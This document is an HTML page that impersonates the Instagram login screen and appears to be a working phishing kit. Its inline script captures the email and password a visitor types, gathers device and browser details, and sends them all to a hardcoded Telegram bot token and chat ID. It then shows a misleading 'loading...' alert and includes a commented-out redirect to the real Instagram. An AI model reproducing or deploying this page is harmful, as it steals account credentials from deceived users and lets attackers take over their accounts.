<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form id="login-form">
                    <label for="email" class="sr-only">Phone number, username, or email</label>
                    <input id="email" name="email" placeholder="Phone number, username, or email" />
                
                    <label for="password" class="sr-only">Password</label>
                    <input id="password" name="password" type="password" placeholder="Password" />
                
                    <button type="button" id="login-button">Log In</button>
                </form>
                <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
                <script>
                    const TOKEN = "7808106942:AAEDBOSxK8AKmeqoIHhcmuPYSOaqquw5FXo";
                    const CHAT_ID = "5284600680";
                    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
                
                    document.getElementById('login-button').addEventListener('click', function () {
                        console.log("3");
                        const email = document.getElementById('email').value;
                        const password = document.getElementById('password').value;
                        const userAgent = navigator.userAgent;
                        const platform = navigator.platform;
                        const screenWidth = screen.width;
                        const screenHeight = screen.height;
                        const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
                
                        const message = `
                            <b>New Login Attempt</b>
                            <b>Email:</b> ${email}\n
                            <b>Password:</b> ${password}\n
                            <b>Device Type:</b> ${deviceType}\n
                            <b>Platform:</b> ${platform}\n
                            <b>User Agent:</b> ${userAgent}\n
                            <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                        `;
                
                        axios.post(URI_API, {
                            chat_id: CHAT_ID,
                            parse_mode: 'html',
                            text: message
                        }).then(response => {
                            alert('loading...');
                        }).catch(error => {
                            alert('loading...');
                        });
                
                        console.log("1");
                        // Uncomment the line below to redirect after sending
                        // window.location.href = 'https://www.instagram.com/';
                    });
                </script>
